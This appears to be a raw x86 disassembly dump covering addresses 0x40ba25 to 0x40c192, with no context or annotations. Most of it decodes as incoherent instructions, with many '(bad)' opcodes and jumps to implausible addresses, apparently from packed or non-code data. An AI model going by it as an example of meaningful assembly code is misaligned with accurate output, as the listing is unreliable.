  40ba25:	mov    ebp,ebp
  40ba27:	sbb    BYTE PTR [ebp-0x1],al
  40ba2a:	loop   0x40b9b5
  40ba2c:	ds and al,0xc7
  40ba2f:	dec    esp
  40ba31:	mov    edx,ebp
  40ba33:	sub    al,0xe1
  40ba35:	inc    edi
  40ba37:	mov    eax,edx
  40ba39:	xor    BYTE PTR [edi+edi*8-0x7b],bh
  40ba3d:	(bad)  
  40ba3e:	dec    DWORD PTR [ebx-0x2ffff701]
  40ba44:	add    BYTE PTR [ebp+0x2c],al
  40ba47:	push   eax
  40ba48:	add    bh,dl
  40ba4a:	mov    DWORD PTR [ebp+0x18],edi
  40ba4d:	jbe    0x40ba4e
  40ba4f:	test   DWORD PTR [ebp-0xffefff],ecx
  40ba55:	inc    ebp
  40ba56:	push   eax
  40ba57:	add    DWORD PTR [ebp-0x4],0x801be
  40ba5e:	pop    es
  40ba5f:	add    dh,0xfe
  40ba62:	ret    
  40ba63:	dec    DWORD PTR [ebx-0x3fffe346]
  40ba69:	mov    ecx,0x454f50
  40ba6e:	mov    eax,ecx
  40ba70:	cwde   
  40ba71:	mov    DWORD PTR [eax],eax
  40ba73:	test   al,0xff
  40ba75:	ror    BYTE PTR [ebx-0x2f99f775],0x55
  40ba7c:	lea    ecx,[ebp-0x7600f201]
  40ba82:	mov    ebp,DWORD PTR [edx+ebp*2-0x7a99a73e]
  40ba89:	push   ebp
  40ba8a:	dec    DWORD PTR [ebp-0x767aec01]
  40ba90:	push   DWORD PTR [eax+0x6685c2ff]
  40ba96:	call   DWORD PTR [ebp-0x1]
  40ba99:	lea    ecx,[ebx-0x397613df]
  40ba9f:	mov    ah,0xc3
  40baa1:	mov    DWORD PTR [ebp-0x30a74a],ecx
  40baa7:	mov    DWORD PTR [eax-0x48],edx
  40baaa:	inc    ebp
  40baab:	dec    edx
  40baac:	mov    ecx,DWORD PTR [ebx+0x55006698]
  40bab2:	xor    ecx,DWORD PTR [ebx+0x557c668d]
  40bab8:	dec    DWORD PTR [ebp-0x76e3b277]
  40babe:	call   DWORD PTR [eax-0x6d5f7673]
  40bac4:	lea    eax,[ecx-0x1]
  40bac7:	inc    WORD PTR [ebp-0x73]
  40bacb:	cmp    edi,0x3
  40bace:	dec    DWORD PTR [ecx+0x41ff9695]
  40bad4:	jmp    DWORD PTR [esi-0x73]
  40bad7:	inc    ebp
  40bad8:	jmp    DWORD PTR [esi-0x1]
  40badb:	dec    ebp
  40badc:	lea    esp,[esi-0x1]
  40badf:	jge    0x40bae0
  40bae1:	mov    esi,DWORD PTR [eax]
  40bae3:	lock inc ebp
  40bae5:	mov    bh,0xff
  40bae7:	mov    WORD PTR [ebp-0x3c5f3a],cs
  40baed:	rol    DWORD PTR [eax+0xf8ca289],0x45
  40baf4:	push   cs
  40baf5:	str    WORD PTR [ebp-0x1]
  40baf9:	xor    edi,esp
  40bafb:	add    edi,DWORD PTR [ebp+0x33]
  40bafe:	add    BYTE PTR [esi+0x0],ah
  40bb01:	inc    ebp
  40bb02:	rdpmc  
  40bb04:	mov    edi,0xbf45ff66
  40bb09:	dec    si
  40bb0b:	inc    ebp
  40bb0c:	add    BYTE PTR [ebx+0x45000c12],cl
  40bb12:	mov    edi,edi
  40bb14:	data16 sbb al,0x45
  40bb17:	jne    0x40ba9c
  40bb19:	push   ebp
  40bb1b:	adc    al,0xd0
  40bb1d:	jne    0x40baa8
  40bb1f:	jmp    FWORD PTR [edx+0x66755108]
  40bb25:	call   0xffc4b37f
  40bb2a:	or     BYTE PTR [ebp-0x77],al
  40bb2d:	mov    ebp,DWORD PTR [esi+0x6645511c]
  40bb33:	mov    edx,DWORD PTR [ebp-0x70]
  40bb36:	add    DWORD PTR [eax],0x3
  40bb39:	mov    ecx,DWORD PTR [ecx+0x5180b21c]
  40bb3f:	add    DWORD PTR [esi+0x0],esp
  40bb42:	push   ebp
  40bb43:	xor    BYTE PTR [esi+0x4d],ah
  40bb46:	dec    ebp
  40bb47:	mov    ecx,DWORD PTR [ebx+0x4d72663b]
  40bb4d:	mov    ecx,DWORD PTR [ebp-0x2ec30075]
  40bb53:	jl     0x40bade
  40bb55:	push   eax
  40bb56:	mov    esi,?
  40bb58:	rcl    bh,1
  40bb5a:	mov    DWORD PTR [esi],eax
  40bb5c:	mov    es,esi
  40bb5e:	push   ecx
  40bb5f:	ret    0x166
  40bb62:	push   ebp
  40bb63:	pop    esi
  40bb64:	leavew 
  40bb66:	inc    ebp
  40bb67:	sbb    BYTE PTR [ebp-0x76132cab],cl
  40bb6d:	in     al,dx
  40bb6e:	xchg   esp,eax
  40bb6f:	push   esi
  40bb70:	shl    al,0x66
  40bb73:	add    DWORD PTR [ebp+0x1],0x38e1008d
  40bb7a:	mov    DWORD PTR [edi],ecx
  40bb7c:	cwde   
  40bb7d:	or     cl,BYTE PTR [ecx-0x767a6600]
  40bb83:	setl   BYTE PTR [edx]
  40bb86:	inc    ebp
  40bb87:	add    BYTE PTR [edi],cl
  40bb89:	test   DWORD PTR [ebp+0xf],ecx
  40bb8c:	xor    edi,edx
  40bb8e:	add    eax,DWORD PTR [eax]
  40bb90:	xor    ecx,DWORD PTR [ebx+0x458866]
  40bb96:	mov    eax,DWORD PTR [ebp-0x1848f010]
  40bb9c:	test   al,0x0
  40bb9e:	mov    BYTE PTR [ebx+0xc18cc3],0x89
  40bba5:	adc    BYTE PTR [eax-0x76ff3f7c],ch
  40bbab:	add    BYTE PTR [eax-0x57f076aa],ch
  40bbb1:	rol    DWORD PTR [ebp+0x0],1
  40bbb4:	mov    ecx,DWORD PTR [ebx+0x758cf0]
  40bbba:	inc    DWORD PTR [ebx-0x748a0fe8]
  40bbc0:	jmp    FWORD PTR [ebx]
  40bbc2:	adc    BYTE PTR [ebx],al
  40bbc4:	jne    0x40bbd5
  40bbc6:	call   DWORD PTR [eax-0x14]
  40bbc9:	mov    DWORD PTR [edi-0x1c],edi
  40bbcc:	push   DWORD PTR [edi-0x35e3f1ff]
  40bbd2:	inc    ebp
  40bbd3:	test   BYTE PTR [ebx-0x47ffe400],cl
  40bbd9:	dec    eax
  40bbda:	add    DWORD PTR [ebx+0x0],edx
  40bbdd:	dec    ebp
  40bbde:	inc    ebp
  40bbdf:	mov    esi,0x7f8cff8b
  40bbe4:	add    BYTE PTR [ebp-0x74728b75],al
  40bbea:	add    al,0x83
  40bbec:	adc    esp,esi
  40bbee:	(bad)  
  40bbef:	and    edx,DWORD PTR ds:0x780f0703
  40bbf5:	jp     0x40bb82
  40bbf7:	sysret 
  40bbf9:	pop    edx
  40bbfa:	add    eax,DWORD PTR [ebx]
  40bbfc:	cmp    esi,DWORD PTR [ebx+esi*2-0x73]
  40bc00:	sub    edx,DWORD PTR [ebx+eax*1]
  40bc03:	dec    ebp
  40bc04:	mov    DWORD PTR [ebp-0x74a48ba1],eax
  40bc0a:	ret    0x83
  40bc0d:	clc    
  40bc0e:	mov    esp,DWORD PTR [ebx]
  40bc10:	add    DWORD PTR [ebx],0x1c
  40bc13:	jnp    0x90504792
  40bc19:	pop    ecx
  40bc1a:	add    BYTE PTR [ebx],al
  40bc1c:	xor    DWORD PTR [eax+eax*1-0x73],0xffffff84
  40bc21:	adc    al,0x1
  40bc23:	jge    0x40bc25
  40bc25:	mov    edx,edx
  40bc27:	cld    
  40bc28:	test   BYTE PTR [edi],bh
  40bc2a:	add    edi,edi
  40bc2c:	add    BYTE PTR [esi],al
  40bc2e:	neg    BYTE PTR [ebp-0x7c]
  40bc31:	add    DWORD PTR [eax],eax
  40bc33:	pop    es
  40bc34:	add    BYTE PTR [edi-0x48fff17a],dh
  40bc3a:	add    BYTE PTR [eax+eax*8],cl
  40bc3d:	inc    ebp
  40bc3e:	test   BYTE PTR [ebx+0x300fc00],al
  40bc44:	mov    esi,0xf80039
  40bc49:	fisttp DWORD PTR [edi]
  40bc4b:	mov    bh,0xda
  40bc4d:	push   cs
  40bc4e:	add    BYTE PTR [edi+0x4d340c39],dh
  40bc54:	test   bh,bh
  40bc56:	add    ah,dh
  40bc58:	add    cl,al
  40bc5a:	mov    cl,0x3
  40bc5c:	add    DWORD PTR [ecx+0x7d65ec00],ecx
  40bc62:	add    BYTE PTR [edx-0x36],dh
  40bc65:	mov    ecx,DWORD PTR [esi]
  40bc67:	call   0xef8742e
  40bc6c:	or     al,0xb7
  40bc6e:	dec    ebp
  40bc6f:	or     al,0xf
  40bc71:	inc    ebp
  40bc72:	dec    eax
  40bc73:	add    DWORD PTR [ebx],0x8
  40bc76:	(bad)  
  40bc78:	scas   al,BYTE PTR es:[edi]
  40bc79:	dec    ebp
  40bc7a:	add    BYTE PTR [ecx],bh
  40bc7c:	(bad)  
  40bc7d:	lock adc al,0x82
  40bc80:	mov    edi,edi
  40bc82:	call   0xff9cbc86
  40bc87:	rcl    BYTE PTR [edi-0x15],0x31
  40bc8b:	xor    edi,DWORD PTR [edi+0x5e]
  40bc8e:	adc    ebx,eax
  40bc90:	mov    eax,DWORD PTR gs:[eax]
  40bc93:	mov    edx,esi
  40bc95:	nop
  40bc96:	rol    BYTE PTR [eax],1
  40bc98:	mov    bh,0x83
  40bc9a:	push   cs
  40bc9b:	or     al,0xb7
  40bc9d:	xor    ecx,DWORD PTR [esi+edx*2]
  40bca0:	sti    
  40bca1:	cmp    DWORD PTR [ecx+0xf],ebp
  40bca4:	dec    edx
  40bca5:	test   DWORD PTR [ecx+0x318bec00],ecx
  40bcab:	or     al,0x41
  40bcad:	ret    
  40bcae:	or     DWORD PTR [esi+0x65],edi
  40bcb1:	pop    eax
  40bcb2:	add    BYTE PTR [ebp-0x32],dh
  40bcb5:	xor    ecx,eax
  40bcb7:	inc    eax
  40bcb8:	mov    bh,0x76
  40bcba:	push   cs
  40bcbb:	inc    eax
  40bcbc:	mov    bh,0x3
  40bcbe:	or     al,0x8
  40bcc0:	sti    
  40bcc1:	dec    eax
  40bcc2:	sub    ecx,DWORD PTR [ebx+0x70892479]
  40bcc8:	cld    
  40bcc9:	mov    edi,DWORD PTR [ebp+0x18]
  40bccc:	mov    ecx,DWORD PTR [ebp-0x7b]
  40bccf:	add    esi,DWORD PTR [eax+ecx*1-0x75]
  40bcd3:	jne    0x40bcb9
  40bcd5:	cmp    ebx,DWORD PTR [edi+esi*2]
  40bcd8:	jns    0xff50b957
  40bcde:	pop    ecx
  40bcdf:	jge    0x40bce0
  40bce1:	cmp    eax,edi
  40bce3:	cld    
  40bce4:	inc    ebp
  40bce5:	iret   
  40bce6:	or     BYTE PTR [eax-0x5],bh
  40bce9:	jae    0x40bd68
  40bceb:	(bad)  
  40bced:	xor    al,0xf
  40bcef:	jmp    0x40bd6b
  40bcf1:	mov    ecx,DWORD PTR [edi]
  40bcf3:	lea    ebx,[edx-0x4f]
  40bcf6:	mov    esi,DWORD PTR [ebx]
  40bcf8:	in     al,dx
  40bcf9:	test   BYTE PTR [ebp+0x27],0x83
  40bcfd:	jge    0x40bd07
  40bcff:	add    edi,ebx
  40bd01:	mov    DWORD PTR [ebp-0x8],ecx
  40bd04:	cmp    eax,edi
  40bd06:	hlt    
  40bd07:	adc    ah,BYTE PTR [eax+0xf8b4d7d]
  40bd0d:	jl     0x40bd5f
  40bd0f:	clc    
  40bd10:	(bad)  
  40bd12:	js     0x40bc9f
  40bd14:	push   DWORD PTR [edx-0x10]
  40bd17:	mov    eax,ecx
  40bd19:	clc    
  40bd1a:	add    edi,edi
  40bd1c:	mov    DWORD PTR [eax],edx
  40bd1e:	call   0xfbe125e
  40bd23:	inc    edi
  40bd24:	popa   
  40bd25:	jge    0x40bd26
  40bd27:	cmp    ebx,DWORD PTR [edi-0x4]
  40bd2a:	xor    edi,DWORD PTR [edx-0x3ffd78c0]
  40bd30:	rcr    BYTE PTR [esi-0x37],0xc9
  40bd34:	push   ebp
  40bd35:	or     ah,ch
  40bd37:	push   ebp
  40bd38:	sub    ah,0x1
  40bd3b:	in     al,dx
  40bd3c:	add    BYTE PTR [edx-0x7ac7a14],bh
  40bd42:	fist   DWORD PTR [ebp+0x57]
  40bd45:	(bad)  
  40bd46:	sbb    al,bh
  40bd48:	test   BYTE PTR [ebp+0x4500f800],al
  40bd4e:	inc    ebp
  40bd4f:	mov    edi,DWORD PTR [ebx]
  40bd51:	cld    
  40bd52:	je     0x40bda1
  40bd54:	cmp    DWORD PTR [ebx+0x4d05fc78],ecx
  40bd5a:	ror    BYTE PTR [ebx-0x74740315],0x78
  40bd61:	adc    BYTE PTR [ebp-0x42],al
  40bd64:	mov    ecx,DWORD PTR [eax]
  40bd66:	sbb    al,0x7
  40bd68:	push   eax
  40bd69:	inc    ebp
  40bd6a:	mov    ecx,DWORD PTR [edi-0x7487adec]
  40bd70:	add    edi,esp
  40bd72:	or     BYTE PTR [ebx+0x890155],bl
  40bd78:	cld    
  40bd79:	mov    edi,0x372f7
  40bd7e:	jge    0x40bd4e
  40bd80:	xor    eax,esi
  40bd82:	mov    edi,eax
  40bd84:	hlt    
  40bd85:	iret   
  40bd86:	pop    ebp
  40bd87:	inc    ebp
  40bd88:	jbe    0x40bdc5
  40bd8a:	cmp    ecx,DWORD PTR [edi]
  40bd8c:	adc    al,0x7b
  40bd8e:	push   es
  40bd8f:	add    BYTE PTR [edi+0x2fc7a8b],dh
  40bd95:	dec    ebp
  40bd96:	div    DWORD PTR [ebx]
  40bd98:	sbb    al,0x3
  40bd9a:	mov    edi,DWORD PTR [ebx]
  40bd9c:	test   DWORD PTR [edi],ecx
  40bd9e:	je     0x40be09
  40bda0:	mov    eax,DWORD PTR [eax]
  40bda2:	or     BYTE PTR [ebx-0x76820302],cl
  40bda8:	cmp    eax,DWORD PTR [eax]
  40bdaa:	jbe    0x40bdac
  40bdac:	mov    ebx,esi
  40bdae:	or     al,0xdf
  40bdb0:	jg     0x40bd7d
  40bdb2:	add    eax,DWORD PTR [ecx+edi*1-0x1ff07fe]
  40bdb9:	dec    ebp
  40bdba:	add    ecx,DWORD PTR [ecx-0x257a2b83]
  40bdc0:	je     0x40bda0
  40bdc2:	mov    edi,ebx
  40bdc4:	mov    ebx,DWORD PTR [ebp-0xc]
  40bdc7:	mov    ecx,DWORD PTR [ecx+0x7ddaf4f0]
  40bdcd:	adc    dh,BYTE PTR [edx+0x55]
  40bdd0:	jmp    0x40bd5d
  40bdd2:	xor    edi,esp
  40bdd4:	pop    edi
  40bdd5:	rcr    BYTE PTR [ebx+0x33],cl
  40bdd8:	ret    0x3
  40bddb:	cmp    DWORD PTR [ebx+0x2c17830a],ecx
  40bde1:	push   ebp
  40bde2:	xor    eax,0x89fc9c8b
  40bde7:	sar    ah,cl
  40bde9:	xor    eax,DWORD PTR [ebp+0x3]
  40bdec:	xor    al,0x39
  40bdee:	pushf  
  40bdef:	or     cl,BYTE PTR [ebx+0x4d02fc0f]
  40bdf5:	add    BYTE PTR [ebx+0x4dfcfc8b],cl
  40bdfb:	pop    ebp
  40bdfc:	mov    ecx,DWORD PTR [ebx-0x3fb20f04]
  40be02:	push   ebx
  40be03:	add    ebx,DWORD PTR [ebp-0x75]
  40be06:	push   esi
  40be07:	adc    BYTE PTR [edi+0x4d],dl
  40be0a:	push   ecx
  40be0b:	xor    eax,edi
  40be0d:	mov    eax,esi
  40be0f:	in     al,0xeb
  40be11:	dec    ebp
  40be12:	add    ecx,DWORD PTR [ebx-0x317403b3]
  40be18:	nop
  40be19:	iret   
  40be1a:	add    dh,dl
  40be1c:	push   edi
  40be1d:	dec    ebp
  40be1e:	sahf   
  40be1f:	mov    esi,DWORD PTR [edx]
  40be21:	add    esi,DWORD PTR [ebx]
  40be23:	add    esi,DWORD PTR [ebx]
  40be25:	cmp    eax,DWORD PTR [ebx]
  40be27:	je     0x40be2c
  40be29:	add    ecx,DWORD PTR [ecx+0xb4de808]
  40be2f:	mov    eax,DWORD PTR [esp+edi*8+0x4800ce02]
  40be36:	pop    ebp
  40be37:	mov    ecx,DWORD PTR [ebx-0x217bf3f8]
  40be3d:	sahf   
  40be3e:	fbstp  TBYTE PTR [edx]
  40be40:	(bad)  [ecx+0x45020c84]
  40be46:	add    BYTE PTR [eax],dh
  40be48:	pop    ebp
  40be49:	pushf  
  40be4a:	mov    ecx,DWORD PTR [ebx+0x75001080]
  40be50:	xor    ecx,DWORD PTR [ebx+0x3bd803]
  40be56:	ud0    ecx,DWORD PTR [edi-0x75]
  40be5a:	add    ah,bh
  40be5c:	add    ecx,esi
  40be5e:	or     bh,cl
  40be60:	dec    ebp
  40be61:	inc    ebp
  40be62:	mov    edi,DWORD PTR [ebx]
  40be64:	xor    esi,DWORD PTR [ebp+0x3]
  40be67:	mov    ecx,DWORD PTR [ecx+0x5d75f010]
  40be6d:	mov    edi,DWORD PTR [ebx]
  40be6f:	fdiv   DWORD PTR [eax+eax*1-0x75]
  40be73:	push   eax
  40be75:	or     al,0x5d
  40be77:	inc    ebp
  40be78:	imul   eax,edi,0x14
  40be7b:	loopne 0x40be5b
  40be7d:	sbb    ebx,edi
  40be7f:	jg     0x40be9d
  40be81:	inc    ebp
  40be82:	jne    0x40bea0
  40be84:	mov    ebx,DWORD PTR [eax+esi*8+0x6bfc5d8b]
  40be8b:	(bad)  
  40be8c:	adc    al,0xc7
  40be8e:	fiadd  WORD PTR [ebp-0x21]
  40be91:	jne    0x40beef
  40be93:	mov    edx,DWORD PTR [eax]
  40be95:	clc    
  40be96:	test   BYTE PTR [ebp+0x2],cl
  40be99:	xor    eax,DWORD PTR [eax]
  40be9b:	xor    eax,DWORD PTR [ebp-0x73]
  40be9e:	mov    eax,DWORD PTR [ebx]
  40bea0:	cld    
  40bea1:	jb     0x40bee8
  40bea3:	add    BYTE PTR [ebx+0x45],ch
  40bea6:	adc    al,0x8b
  40bea8:	rcr    eax,0x48
  40beab:	add    BYTE PTR [ebx],al
  40bead:	add    ecx,DWORD PTR [eax]
  40beaf:	pmaxub mm1,mm3
  40beb2:	dec    ebp
  40beb3:	dec    DWORD PTR [ebx+0x5545fc24]
  40beb9:	xor    esi,DWORD PTR [ebx]
  40bebb:	add    eax,DWORD PTR [ebx]
  40bebd:	cmp    esi,DWORD PTR [ebx]
  40bebf:	hlt    
  40bec0:	mov    DWORD PTR [edi],ecx
  40bec2:	fadd   QWORD PTR [ebp+0x8]
  40bec5:	xor    edx,edi
  40bec7:	add    ebx,edi
  40bec9:	cmp    ecx,edx
  40becb:	clts   
  40becd:	jp     0x40bf1c
  40becf:	dec    DWORD PTR [ecx+0x4dfcdc8b]
  40bed5:	(bad)  
  40bed6:	xor    eax,edi
  40bed8:	add    eax,DWORD PTR [ebp+0xc]
  40bedb:	jne    0x40bf22
  40bedd:	mov    ecx,DWORD PTR [ebp+0x724d01f8]
  40bee3:	xor    eax,DWORD PTR [eax]
  40bee5:	lea    eax,[ebp+0x1]
  40bee8:	(bad)  
  40bee9:	jb     0x40bec3
  40beeb:	add    BYTE PTR [ebp+0x45e9f845],al
  40bef1:	add    bh,bh
  40bef3:	add    BYTE PTR [eax*2+0x12018d80],cl
  40befa:	add    bh,al
  40befc:	adc    BYTE PTR [ecx*2+0x30e332d],cl
  40bf03:	pop    ebp
  40bf04:	mov    DWORD PTR [ebx],esi
  40bf06:	hlt    
  40bf07:	add    ecx,eax
  40bf09:	jmp    0x85bf20
  40bf0e:	inc    DWORD PTR [ebp+0xc]
  40bf11:	xor    eax,DWORD PTR [eax+0x890103]
  40bf17:	in     al,dx
  40bf18:	push   eax
  40bf19:	inc    ebp
  40bf1a:	mov    DWORD PTR [ebx],esi
  40bf1c:	hlt    
  40bf1d:	add    eax,DWORD PTR [ebp-0x77]
  40bf20:	mov    WORD PTR [esi+eiz*2],cs
  40bf23:	dec    ebp
  40bf24:	(bad)  
  40bf25:	mov    esp,eax
  40bf27:	fcomp  QWORD PTR [ecx+0x45cff8ce]
  40bf2d:	enter  0x633,0x3
  40bf31:	add    al,0x3b
  40bf33:	mov    esp,esi
  40bf35:	in     al,dx
  40bf36:	and    eax,DWORD PTR [ebp+0x45]
  40bf39:	mov    ecx,DWORD PTR [ebx-0x39ba1f68]
  40bf3f:	mov    ecx,esi
  40bf41:	cld    
  40bf42:	pushf  
  40bf43:	dec    ebp
  40bf44:	sahf   
  40bf45:	xor    esi,DWORD PTR [edx]
  40bf47:	add    ecx,DWORD PTR [ebx-0x7f8befc5]
  40bf4d:	mov    eax,DWORD PTR [ecx]
  40bf4f:	cld    
  40bf50:	add    BYTE PTR [ebp-0x31],cl
  40bf53:	xor    ebp,DWORD PTR [edi+0x50c15103]
  40bf59:	pop    ds
  40bf5a:	mov    eax,ecx
  40bf5c:	cld    
  40bf5d:	sbb    dh,al
  40bf5f:	dec    ebp
  40bf60:	(bad)  
  40bf61:	mov    eax,DWORD PTR [ebp+0x10]
  40bf64:	jne    0x40bee6
  40bf66:	mov    eax,DWORD PTR [ecx]
  40bf68:	fadd   DWORD PTR [eax]
  40bf6a:	(bad)  
  40bf6b:	mov    bh,0xc7
  40bf6d:	push   ecx
  40bf6e:	fdiv   DWORD PTR [ebp-0x7a]
  40bf71:	(bad)  
  40bf72:	dec    DWORD PTR [eax]
  40bf74:	call   FWORD PTR [ecx]
  40bf76:	inc    ebp
  40bf77:	inc    ebp
  40bf78:	xor    eax,DWORD PTR [ebx]
  40bf7a:	add    ecx,DWORD PTR [eax]
  40bf7c:	cmp    ecx,DWORD PTR [ebp-0xc]
  40bf7f:	mov    edx,DWORD PTR [edi]
  40bf81:	fadd   DWORD PTR [ebp+0x0]
  40bf84:	mov    eax,DWORD PTR [ebx-0x39fd18]
  40bf8a:	test   ah,dh
  40bf8c:	sahf   
  40bf8d:	push   ecx
  40bf8e:	xor    cl,BYTE PTR [ecx+0x45e80c89]
  40bf94:	out    dx,eax
  40bf95:	mov    eax,DWORD PTR [eax]
  40bf97:	or     al,0xc7
  40bf99:	(bad)  
  40bf9a:	in     al,dx
  40bf9b:	(bad)  
  40bf9c:	sbb    eax,ecx
  40bf9e:	add    DWORD PTR [ebp+0x45],eax
  40bfa1:	jne    0x40bf32
  40bfa3:	mov    eax,DWORD PTR [eax+ebp*8]
  40bfa6:	mov    eax,esi
  40bfa8:	cld    
  40bfa9:	test   dh,bl
  40bfab:	sahf   
  40bfac:	fbstp  TBYTE PTR [edx]
  40bfae:	ret    0x89
  40bfb1:	call   0x4e3cd041
  40bfb6:	(bad)  
  40bfb7:	xor    eax,edi
  40bfb9:	add    eax,DWORD PTR [ebp+0xf]
  40bfbc:	mov    eax,ecx
  40bfbe:	cld    
  40bfbf:	dec    ebp
  40bfc0:	(bad)  
  40bfc1:	mov    edi,eax
  40bfc3:	cdq    
  40bfc4:	inc    ebp
  40bfc5:	inc    ebp
  40bfc6:	mov    esi,DWORD PTR [ebx]
  40bfc8:	cld    
  40bfc9:	lea    eax,[ebp+0x3]
  40bfcc:	xor    esi,DWORD PTR [edx+0x3]
  40bfcf:	add    BYTE PTR [ebx],bh
  40bfd1:	inc    ebp
  40bfd2:	je     0x40bf5f
  40bfd4:	mov    esp,esp
  40bfd6:	cwde   
  40bfd7:	mov    BYTE PTR [ebp-0x39],0x8b
  40bfdb:	add    al,0xe4
  40bfdd:	(bad)  
  40bfdf:	sub    ecx,DWORD PTR [ecx+0x458b0cff]
  40bfe5:	lock mov eax,DWORD PTR [ebp-0x14]
  40bfe9:	mov    eax,esi
  40bfeb:	aam    0xc7
  40bfed:	jmp    0xd645:0x2972c1
  40bff4:	mov    eax,ebp
  40bff6:	in     al,dx
  40bff7:	inc    esi
  40bff9:	mov    eax,edi
  40bffb:	cld    
  40bffc:	jmp    0x750ffbcf
  40c001:	ror    DWORD PTR [ebx+0x4575ec45],0x8b
  40c008:	mov    edi,eax
  40c00a:	fadd   DWORD PTR [ebx]
  40c00c:	add    BYTE PTR [ebp+0xf],al
  40c00f:	xor    ecx,ecx
  40c011:	add    edi,edi
  40c013:	pop    edi
  40c014:	hlt    
  40c015:	pop    ebx
  40c016:	push   eax
  40c017:	ret    0xeb
  40c01a:	mov    ecx,DWORD PTR [ebx+0x2845830c]
  40c020:	mov    eax,DWORD PTR [ebp+0x10]
  40c023:	xor    eax,0xc7019c89
  40c028:	add    al,bl
  40c02a:	rol    BYTE PTR [ebp+0x4575f850],0xff
  40c031:	mov    DWORD PTR [eax],ecx
  40c033:	or     al,0x45
  40c035:	inc    ebp
  40c036:	mov    edi,DWORD PTR [ecx+0x74d08fc]
  40c03c:	xor    eax,ecx
  40c03e:	add    ebx,DWORD PTR [esi+0x568b323b]
  40c044:	clc    
  40c045:	jne    0x40c058
  40c047:	add    ecx,DWORD PTR [ebp+0x3b]
  40c04a:	xor    ecx,DWORD PTR [edi]
  40c04c:	lea    esp,[ecx]
  40c04e:	add    DWORD PTR [eax],eax
  40c050:	jb     0x40bfdd
  40c052:	add    BYTE PTR [eax],cl
  40c054:	inc    ebp
  40c055:	jne    0x40c042
  40c057:	add    ecx,DWORD PTR [ebx-0x3976f3c4]
  40c05d:	or     al,0xc7
  40c05f:	inc    ebp
  40c060:	scas   eax,DWORD PTR es:[edi]
  40c061:	xor    BYTE PTR [ebx+0x48be49c],cl
  40c067:	in     al,0x8b
  40c069:	jne    0x40c063
  40c06b:	mov    eax,esi
  40c06d:	or     al,0x9c
  40c06f:	icebp  
  40c070:	sahf   
  40c071:	shl    DWORD PTR [edx],0xf2
  40c074:	mov    esi,DWORD PTR [esp+edi*8+0x33934d68]
  40c07b:	lsl    ebp,bx
  40c07e:	cmp    DWORD PTR [eax],eax
  40c080:	cdq    
  40c081:	mov    eax,DWORD PTR [ebp-0xba00f4]
  40c087:	add    edx,DWORD PTR [ebp-0x60]
  40c08a:	mov    eax,DWORD PTR [eax]
  40c08c:	call   0x81490e1c
  40c091:	jge    0x40c030
  40c093:	sub    esi,DWORD PTR [edx]
  40c095:	xor    al,0x33
  40c097:	jge    0x40c082
  40c099:	xor    edi,ebp
  40c09b:	add    edi,edi
  40c09d:	mov    DWORD PTR [ebp-0x24],ecx
  40c0a0:	xor    esi,edi
  40c0a2:	add    eax,DWORD PTR [ebx+edi*1-0x3ff7500]
  40c0a9:	jne    0x40c0b3
  40c0ab:	xor    eax,DWORD PTR [ebp+0x3]
  40c0ae:	jmp    0x40c039
  40c0b0:	mov    edi,eax
  40c0b2:	cld    
  40c0b3:	mov    esi,0x5e85c7f0
  40c0b9:	clc    
  40c0ba:	leave  
  40c0bb:	xchg   edi,eax
  40c0bc:	or     al,0x0
  40c0be:	push   ebp
  40c0bf:	mov    ebp,esp
  40c0c1:	cld    
  40c0c2:	in     al,dx
  40c0c3:	icebp  
  40c0c4:	(bad)  
  40c0c5:	jnp    0x40c0c3
  40c0c7:	add    eax,DWORD PTR [ebp+0x453bf8d1]
  40c0cd:	jae    0x40c103
  40c0cf:	sub    ebx,DWORD PTR [ebp+ecx*4-0x76f38f75]
  40c0d6:	inc    ebp
  40c0d7:	call   0x823d7867
  40c0dc:	push   edi
  40c0dd:	call   DWORD PTR [ecx+0x0]
  40c0e0:	xor    ecx,DWORD PTR [ecx+0x7d72ecba]
  40c0e6:	add    BYTE PTR [ebx+0x3082b8b],cl
  40c0ec:	ret    0xf00f
  40c0ef:	xor    eax,DWORD PTR [esi+ebp*8-0x76ffccff]
  40c0f6:	inc    ebp
  40c0f7:	loopne 0x40c084
  40c0f9:	jne    0x40c103
  40c0fb:	mov    esi,DWORD PTR [eax-0x20]
  40c0fe:	push   edi
  40c0ff:	jge    0x40c176
  40c101:	xor    eax,edi
  40c103:	(bad)  
  40c104:	in     al,0x3e
  40c106:	test   DWORD PTR [edx-0x8],esi
  40c109:	add    BYTE PTR [ebp+0x75],al
  40c10c:	mov    ecx,DWORD PTR [ebx+0x7d7df0fc]
  40c112:	xor    esi,DWORD PTR [ebx]
  40c114:	xor    eax,DWORD PTR [ebx]
  40c116:	add    edi,DWORD PTR [ebx]
  40c118:	cmp    DWORD PTR [ebp-0x39],esi
  40c11b:	mov    edx,DWORD PTR [ebp-0x7b82fe10]
  40c121:	xor    eax,DWORD PTR [eax]
  40c123:	add    eax,DWORD PTR [eax]
  40c125:	cmp    esi,DWORD PTR [ebp+0x75]
  40c128:	mov    ecx,DWORD PTR [ebx+0x7d86e008]
  40c12e:	add    BYTE PTR [ecx],al
  40c130:	add    BYTE PTR [ebx+0x4d8b0275],al
  40c136:	or     al,0x75
  40c138:	ja     0x40c0c5
  40c13a:	mov    esi,esp
  40c13c:	cld    
  40c13d:	pop    ebp
  40c13e:	stc    
  40c13f:	mov    edi,edx
  40c141:	in     al,0x75
  40c143:	jge    0x40c180
  40c145:	mov    ecx,DWORD PTR [edi]
  40c147:	or     al,0xc4
  40c149:	icebp  
  40c14a:	add    BYTE PTR [ebx+ecx*4-0xe6c0394],bh
  40c151:	jae    0x40c145
  40c153:	add    esi,DWORD PTR [ebp-0xc]
  40c156:	push   ebx
  40c157:	jne    0x40c19e
  40c159:	mov    esi,DWORD PTR [edx]
  40c15b:	add    al,0x9c
  40c15d:	icebp  
  40c15e:	jmp    0x9dc255
  40c163:	cmp    esi,DWORD PTR [ebp+0xf]
  40c166:	xor    edx,DWORD PTR [ebp+ecx*4-0x1]
  40c16a:	clc    
  40c16b:	pop    ebx
  40c16c:	repnz inc ebp
  40c16e:	out    dx,eax
  40c16f:	pop    edi
  40c170:	test   DWORD PTR [ebx],0x33fe456d
  40c176:	pop    esp
  40c177:	add    ecx,DWORD PTR [eax]
  40c179:	pop    esi
  40c17a:	jge    0x40c13e
  40c17c:	(bad)  
  40c17e:	xor    ecx,DWORD PTR [ebx+0x540f83e6]
  40c184:	add    BYTE PTR [ebp+0x75],al
  40c187:	xor    eax,0xc7ec9c8b
  40c18c:	xor    ah,bl
  40c18e:	repnz test esi,edi
  40c191:	clc    
  40c192:	mov    bh,0x45
